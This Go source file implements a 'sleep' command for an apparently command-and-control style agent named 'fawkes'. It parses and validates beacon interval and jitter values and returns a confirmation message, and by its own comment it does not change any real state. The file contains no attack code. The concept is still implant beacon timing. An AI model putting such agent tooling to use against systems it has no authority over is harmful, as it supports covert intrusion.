package commands

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"strings"

	"fawkes/pkg/structs"
)

// SleepCommand implements the sleep command
type SleepCommand struct{}

// Name returns the command name
func (c *SleepCommand) Name() string {
	return "sleep"
}

// Description returns the command description  
func (c *SleepCommand) Description() string {
	return "Update the sleep interval and jitter of the agent"
}

// Execute executes the sleep command
func (c *SleepCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var args struct {
		Interval int `json:"interval"`
		Jitter   int `json:"jitter"`
	}

	// Try to parse as JSON first
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// If not JSON, try to parse as space-separated values
		parts := strings.Fields(task.Params)
		if len(parts) >= 1 {
			if interval, err := strconv.Atoi(parts[0]); err == nil {
				args.Interval = interval
			} else {
				return structs.CommandResult{
					Output:    fmt.Sprintf("Invalid interval value: %s", parts[0]),
					Status:    "error",
					Completed: true,
				}
			}
		}
		if len(parts) >= 2 {
			if jitter, err := strconv.Atoi(parts[1]); err == nil {
				args.Jitter = jitter
			} else {
				return structs.CommandResult{
					Output:    fmt.Sprintf("Invalid jitter value: %s", parts[1]),
					Status:    "error",
					Completed: true,
				}
			}
		}
	}

	// Validate values
	if args.Interval < 0 {
		return structs.CommandResult{
			Output:    "Sleep interval cannot be negative",
			Status:    "error", 
			Completed: true,
		}
	}

	if args.Jitter < 0 || args.Jitter > 100 {
		return structs.CommandResult{
			Output:    "Jitter must be between 0 and 100",
			Status:    "error",
			Completed: true,
		}
	}

	// Update sleep parameters (this would normally update global agent state)
	output := fmt.Sprintf("Updated sleep parameters: interval=%ds, jitter=%d%%", args.Interval, args.Jitter)
	
	// Log the change
	log.Printf("[INFO] Sleep parameters updated: interval=%d, jitter=%d", args.Interval, args.Jitter)

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}